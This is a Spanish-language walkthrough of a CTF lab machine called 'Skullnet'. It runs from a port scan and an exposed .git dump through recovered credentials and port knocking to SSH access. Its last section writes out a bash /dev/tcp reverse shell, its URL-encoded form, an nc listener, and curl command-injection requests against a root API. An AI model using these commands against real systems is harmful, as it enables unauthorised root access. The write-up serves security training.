Maquina: Skullnet

Autor: The Hacker Labs

Dificultad: Dificil

![Screenshot 2024-11-16 095739](https://github.com/user-attachments/assets/5b69c447-8f76-4777-89e0-f4dcc3380249)

ping 172.18.0.2 -c 1

![Screenshot 2024-11-16 103630](https://github.com/user-attachments/assets/98973b45-693a-4426-8722-d09e20842a5a)

Realizamos un escaneo de los puertos

nmap -sC -sV -Pn 172.18.0.2 -oG escaneo

![Screenshot 2024-11-16 103847](https://github.com/user-attachments/assets/7c3f10fb-1286-4be3-a496-72c98e456203)

Realizamos un escaneo mas detallado y encontramos un directorio .git

nmap -sC -sV -Pn --open 172.18.0.2

![Screenshot 2024-11-16 104931](https://github.com/user-attachments/assets/2e98fb2b-410d-49a9-8380-8d4ac43c0b04)

vamos a la web encontrada del repositorio de git 

http://skullnet.es/.git/

![Screenshot 2024-11-16 113342](https://github.com/user-attachments/assets/66024a49-87e3-4558-b20f-d078a9cccaee)

usamos wget

wget -r http://skullnet.es/.git/

![Screenshot 2024-11-16 113355](https://github.com/user-attachments/assets/bec08fe1-f665-4fd4-aa3c-b4c1590e39f5)

ls    

cd skullnet.es    

ls -a 

git log

descubrimos 2 hashes

![Screenshot 2024-11-16 113415](https://github.com/user-attachments/assets/fd0e2d19-6129-4461-baac-bb362bdcdcc2)

Revisamos cada commit, en el primero observamos que tenemos un mensaje

git show 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9

![Screenshot 2024-11-16 113450](https://github.com/user-attachments/assets/90f6aea5-1218-46be-af7a-e20338352a19)

En el segundo commit tenemos lo siguiente

git show 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d

![Screenshot 2024-11-16 113517](https://github.com/user-attachments/assets/c05d26f4-3e00-4c90-9402-211f92fe6e5b)

Observamos que identificamos varios archivos

Para recuperar los archivos

git reset 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d  

ls

git diff

![Screenshot 2024-11-16 113947](https://github.com/user-attachments/assets/04154f80-6e89-42ee-9d41-134210af4d34)

git checkout -- .

ls

![Screenshot 2024-11-16 114032](https://github.com/user-attachments/assets/77132f4c-6b43-441b-bbed-352c054579ae)

cat authentication.txt

Obtenemos unas credenciales

skulloperator:+%7nj^g!DQxp]a>c4v&0

![Screenshot 2024-11-16 114058](https://github.com/user-attachments/assets/af9b81e8-37e2-441d-8cb1-b3357391d8eb)

Seguimos revisando y ahora debemos buscar el archivo /network.pcap

wireshark network.pcap

Abrimos el archivo con whireshark, como la consulta es corta podemos hacerlo manual. 
Comprobando la captura podemos observar que en la IP de nuestro interés se tiene comunicación con el puerto SSH y 3 puertos adicionales

![Screenshot 2024-11-16 114313](https://github.com/user-attachments/assets/68f61549-87d5-4247-a292-55ba1e440311)

Con esta información realizaremos un port knocking a los puertos encontrados

knock -v 172.18.0.2 1000 12000 5000

![Screenshot 2024-11-16 115003](https://github.com/user-attachments/assets/f7922159-5e99-482c-a5da-0d49b6b83772)

ejecutar nmap

nmap -p22 172.18.0.2

![Screenshot 2024-11-16 115021](https://github.com/user-attachments/assets/297d6b9f-5e74-45e4-a64d-950c1835fd18)

Ya que tenemos habilitado el puerto SSH 

Accedemos por ssh con las credenciales obtenidas

ssh skulloperator@172.18.0.2

![Screenshot 2024-11-16 115325](https://github.com/user-attachments/assets/7b48504b-c5aa-45c3-8e89-5eb1916a83a9)

ls

cat user.txt

![Screenshot 2024-11-16 115325](https://github.com/user-attachments/assets/ade0c15d-6f3c-492e-9fd8-4d466f0f8c50)

![Screenshot 2024-11-16 115412](https://github.com/user-attachments/assets/646eaf72-a5e0-41df-8d4d-eaabf55afb2e)

Revisando procesos observamos que tenemos el archivo skullnet_api.py que lo está ejecutando root

ps aux

![Screenshot 2024-11-16 115456](https://github.com/user-attachments/assets/89ca00b4-83a3-4686-a62b-4fef27642f6e)

Abrimos el archivo y podemos observar el siguiente escucha en el puerto 8081 y ejecuta comandos cuando recibe una solicitud http get con un parámetro específico

Este código para la parte de autenticación espera un encabezado Authorization con el esquema de basic como tenemos la clave de autenticación AUTH_KEY_BASE64 y si esa sección convertimos de base 64 podemos observar lo siguiente.

echo "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA==" | base64 -d

Con esto en conocimiento la estructura del encabezado de Authorization sería la siguiente.

Authorization: basic we_are_bones_513546516486484

usamos curl con el parametro exec

Ejecutamos el comando y podemos observar que listamos archivos y también podemos observar que los ejecutamos como root

curl http://localhost:8081/?exec-ls -H 'Authorization: Basic we_are_bones_513546516486484'
close.sh
open.sh
root.txt

curl http://localhost:8081/?exec-whoami -H 'Authorization: Basic we_are_bones_513546516486484'

Con esto en mente podemos establecer una revshell

bash -c 'bash -i >& /dev/tcp/172.18.0.2/1234 0>&1'

La URL encodeamos para evitar problemas

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%22

iniciamos netcat

nc -lvnp 1234

URL en codeado sería %3B, Con este permiso lo que hacemos es agregar el comando luego del ls

curl http://localhost:8081/?exec=ls%3Bbash%20-c%20%22bash%20-i%

Si vamos a nuestro listener podemos observar que ya tenemos acceso a la consola de root
